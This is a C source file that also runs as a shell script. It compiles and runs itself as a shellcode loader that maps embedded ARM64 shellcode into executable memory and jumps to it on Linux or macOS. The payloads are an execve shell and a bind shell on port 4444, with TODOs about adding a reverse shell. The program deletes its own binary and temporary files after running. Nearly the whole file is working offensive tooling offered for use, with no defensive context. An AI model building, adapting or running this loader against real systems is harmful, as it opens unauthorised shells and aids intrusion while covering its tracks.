#if defined(__linux__)  // Ref: https://stackoverflow.com/a/42040445
    #define __start() __start()
#elif defined(__APPLE__) && defined(__MACH__)
    #define __start() _start()
#endif
#if 0
    EXEC=${0%.*}
    test -x "$EXEC" || gcc -x c "$0" -o "$EXEC"
    mkdir -p tmp && touch tmp/ldd.c
    cp "$0" tmp/ldd.c
    exec "$EXEC"
#endif
#include <stdio.h>
#include <sys/utsname.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

int (*sc)();
int __start() {
    char *shellcode = getenv("SHC");
    size_t length = (size_t) strlen(shellcode);
    printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

    // Define pointer
    void *ptr = mmap(0, length, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE, -1, 0);
    if (ptr == MAP_FAILED) {
        perror("mmap");
        exit(-1);
    }
    printf("[+] SUCCESS: mmap\n");
    printf("    |-> Return = %p\n", ptr);

    // Copy shellcode to pointer
    void *dst = memcpy(ptr, shellcode, length);
    printf("[+] SUCCESS: memcpy\n");
    printf("    |-> Return = %p\n", dst);

    // Read + Exec data in pointer
    int status = mprotect(ptr, length, PROT_EXEC | PROT_READ);
    if (status == -1) {
        perror("mprotect");
        exit(-1);
    }
    printf("[+] SUCCESS: mprotect\n");
    printf("    |-> Return = %d\n", status);
    printf("[>] Trying to execute shellcode...\n");

    sc = ptr;
    sc();
    return 0;
}

void opts() {
    puts("Linux/Darwin\n - execve shell\t\t(s)\n - execve bindshell\t(b)\n\t(at 127.0.0.1:4444)");
}

void rollback(char *purgeEntry) {
    system(purgeEntry);
    system("rm -rf tmp");
}

// TODO: 
// - verify if gcc/clang installed before running code
// - catch signals (https://www.thegeekstuff.com/2012/03/catch-signals-sample-c-code/)
// - Test reverse shell
// Update: Doesn't work in Fedora (https://www.exploit-db.com/papers/13098)
// Update: Linux works (shellcode must have correct registers, darwin registers have different names); _start works as loader
int main(int argc, char *argv[]) {
    char purgeEntry[strlen(argv[0])];
    sprintf(purgeEntry, "rm %s", argv[0]);
    char opt = argv[0][strlen(argv[0])-1];
    struct utsname uts;

    uname(&uts);
    printf("%s / %s\n", uts.sysname, uts.machine);
    if (strcmp("Linux", uts.sysname) == 0) {
        if (strcmp("aarch64", uts.machine)) { printf("OS Architecture not valid"); rollback(purgeEntry); return 1; }
        if (opt == 's') {
            putenv("SHC=\xe1\x45\x8c\xd2\x21\xcd\xad\xf2\xe1\x65\xce\xf2\x01\x0d\xe0\xf2\xe1\x8f\x1f\xf8\xe1\x03\x1f\xaa\xe2\x03\x1f\xaa\xe0\x63\x21\x8b\xa8\x1b\x80\xd2\xe1\x66\x02\xd4");
        } else if (opt == 'b') {
	    putenv("SHC=\xc8\x18\x80\xd2\x01\xfd\x47\xd3\x20\xf8\x7f\xd3\xe2\x03\x1f\xaa\xe1\x66\x02\xd4\xe4\x03\x20\xaa\x21\xf8\x7f\xd3\x21\x82\xab\xf2\xe1\x0f\x1f\xf8\xe1\x63\x22\x8b\x02\x02\x80\xd2\x08\x19\x80\xd2\xe1\x66\x02\xd4\xe0\x03\x24\xaa\x41\xfc\x43\xd3\x28\x19\x80\xd2\xe1\x66\x02\xd4\xe5\x03\x01\xaa\xe0\x03\x24\xaa\xe1\x03\x1f\xaa\xe2\x03\x1f\xaa\x48\x19\x80\xd2\xe1\x66\x02\xd4\xe4\x03\x20\xaa\xa1\xf8\x7f\xd3\xe0\x03\x24\xaa\x21\xfc\x41\xd3\xe2\x03\x1f\xaa\x08\x03\x80\xd2\xe1\x66\x02\xd4\xea\x03\x1f\xaa\x5f\x01\x01\xeb\x21\xff\xff\x54\xe3\x45\x8c\xd2\x23\xcd\xad\xf2\xe3\x65\xce\xf2\x03\x0d\xe0\xf2\xe3\x0f\x1f\xf8\xe0\x63\x21\x8b\xa8\x1b\x80\xd2\xe1\x66\x02\xd4");
        } else { puts("modus operandi needed\n-----"); rollback(purgeEntry); opts(); return 1; }
    } else if (strcmp("Darwin", uts.sysname) == 0) {
        if (strcmp("arm64", uts.machine)) { printf("OS Architecture not valid"); rollback(purgeEntry); return 1; }
        if (opt == 's') { 
            putenv("SHC=\xe1\x45\x8c\xd2\x21\xcd\xad\xf2\xe1\x65\xce\xf2\x01\x0d\xe0\xf2\xe1\x83\x1f\xf8\x01\x01\x80\xd2\xe0\x63\x21\xcb\xe1\x03\x1f\xaa\xe2\x03\x1f\xaa\x70\x07\x80\xd2\xe1\x66\x02\xd4\x01\x00\x00\x00\x1c\x00\x00\x00\x00\x00\x00\x00\x1c\x00\x00\x00\x00\x00\x00\x00\x1c\x00\x00\x00\x02\x00\x00\x00\x8c\x3f\x00\x00\x34\x00\x00\x00\x34\x00\x00\x00\xb9\x3f\x00\x00\x00\x00\x00\x00\x34\x00\x00\x00\x03\x00\x00\x00\x0c\x00\x01\x00\x10\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00");
        } else if (opt == 'b') {
            putenv("SHC=\x30\x0c\x80\xd2\x01\xfe\x46\xd3\x20\xf8\x7f\xd3\xe2\x03\x1f\xaa\xe1\x66\x02\xd4\xe3\x03\x20\xaa\x01\x42\x80\xd2\x21\x82\xab\xf2\xe1\x83\x1f\xf8\x02\x01\x80\xd2\xe1\x63\x22\xcb\x02\x02\x80\xd2\x10\x0d\x80\xd2\xe1\x66\x02\xd4\xe0\x03\x23\xaa\x41\xfc\x43\xd3\x50\x0d\x80\xd2\xe1\x66\x02\xd4\xe0\x03\x23\xaa\xe1\x03\x1f\xaa\xe2\x03\x1f\xaa\xd0\x03\x80\xd2\xe1\x66\x02\xd4\xe3\x03\x20\xaa\x02\xfe\x44\xd3\x42\xf4\x7e\xd3\xe0\x03\x23\xaa\x42\xfc\x41\xd3\xe1\x03\x02\xaa\x50\x0b\x80\xd2\xe1\x66\x02\xd4\xea\x03\x1f\xaa\x5f\x01\x02\xeb\x21\xff\xff\x54\xe1\x45\x8c\xd2\x21\xcd\xad\xf2\xe1\x65\xce\xf2\x01\x0d\xe0\xf2\xe1\x83\x1f\xf8\x01\x01\x80\xd2\xe0\x63\x21\xcb\xe1\x03\x1f\xaa\xe2\x03\x1f\xaa\x70\x07\x80\xd2\xe1\x66\x02\xd4\x01\x00\x00\x00\x1c\x00\x00\x00\x00\x00\x00\x00\x1c\x00\x00\x00\x00\x00\x00\x00\x1c\x00\x00\x00\x02\x00\x00\x00\x04\x3f\x00\x00\x34\x00\x00\x00\x34\x00\x00\x00\xb9\x3f\x00\x00\x00\x00\x00\x00\x34\x00\x00\x00\x03\x00\x00\x00\x0c\x00\x01\x00\x10\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00");
        } else { puts("modus operandi needed\n-----"); rollback(purgeEntry); opts(); return 1; }
    }
    system("gcc -nostartfiles -e __start -o ldd -x c tmp/ldd.c");
    system("./ldd");
    system(purgeEntry);
    system("rm ldd");
    system("rm -rf tmp");
    return 0;
}
